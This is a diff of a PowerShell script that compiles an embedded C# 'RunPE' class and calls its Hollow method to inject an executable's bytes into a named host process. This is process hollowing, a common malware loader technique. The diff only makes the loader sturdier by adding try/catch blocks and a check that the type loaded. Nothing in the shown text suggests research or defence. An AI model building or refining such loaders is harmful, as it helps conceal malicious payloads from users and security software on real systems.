@@ -417,9 +417,15 @@ public class RunPE {
 '@
     Log-Msg "Compiling/Adding C# RunPE type..."
     if (-not ([System.Management.Automation.PSTypeName]"RunPE").Type) {
-        Add-Type -TypeDefinition $PECode -Language CSharp
+        try {
+            Add-Type -TypeDefinition $PECode -Language CSharp -ErrorAction Stop
+            Log-Msg "RunPE type successfully compiled/added."
+        } catch {
+            Log-Msg "WARNING: Failed to compile RunPE type: $_"
+        }
+    } else {
+        Log-Msg "RunPE type already compiled/added."
     }
-    Log-Msg "RunPE type successfully compiled/added."
 
 # -- 1. Stop any running instances ---------------------------------------------
 Write-Host "[1/4] Stopping existing instances..." -ForegroundColor Yellow
@@ -487,12 +493,16 @@ Log-Msg "Section 1 complete."
     if (Test-Path $oldFolder) { Remove-Item $oldFolder -Recurse -Force -ErrorAction SilentlyContinue }
 
     $hollowSuccess = $false
-    try {
-        Log-Msg "Calling [RunPE]::Hollow on host: $HostProcess"
-        $hollowSuccess = [RunPE]::Hollow($exeBytes, $HostProcess)
-        Log-Msg "[RunPE]::Hollow returned: $hollowSuccess"
-    } catch {
-        Log-Msg "WARNING: Process hollowing threw an exception: $_"
+    if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
+        try {
+            Log-Msg "Calling [RunPE]::Hollow on host: $HostProcess"
+            $hollowSuccess = [RunPE]::Hollow($exeBytes, $HostProcess)
+            Log-Msg "[RunPE]::Hollow returned: $hollowSuccess"
+        } catch {
+            Log-Msg "WARNING: Process hollowing threw an exception: $_"
+        }
+    } else {
+        Log-Msg "WARNING: RunPE type is not available. Skipping process hollowing."
     }
 
     $started = $false
